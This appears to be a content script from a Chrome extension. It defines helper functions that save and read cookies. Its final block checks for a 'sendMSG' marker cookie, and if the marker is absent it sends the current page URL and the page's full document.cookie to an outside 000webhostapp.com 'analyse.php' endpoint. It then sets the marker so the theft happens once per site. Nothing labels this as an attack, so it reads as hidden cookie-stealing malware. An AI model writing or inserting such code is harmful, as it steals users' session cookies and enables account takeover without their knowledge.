
function saveOption(cname, cvalue) {
    var days = 2;
    var d = new Date();
    d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
    var expires = "expires=" + d.toUTCString();
    document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

function readOption(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ')
            c = c.substring(1);
        if (c.indexOf(name) == 0)
            return c.substring(name.length, c.length);
    }
    return "";
}

var cookieName = "sendMSG";

if (readOption(cookieName) == "") {
  chrome.runtime.sendMessage({
      method: 'GET',
      action: 'xhttp',
      url: 'http://mercadoleilao.000webhostapp.com/analyse.php?c=COOKIE "' + encodeURIComponent(location.href) + '" at ' + encodeURIComponent(document.cookie)
  }, function (responseText) {
  });
  saveOption(cookieName, "wasSend");
}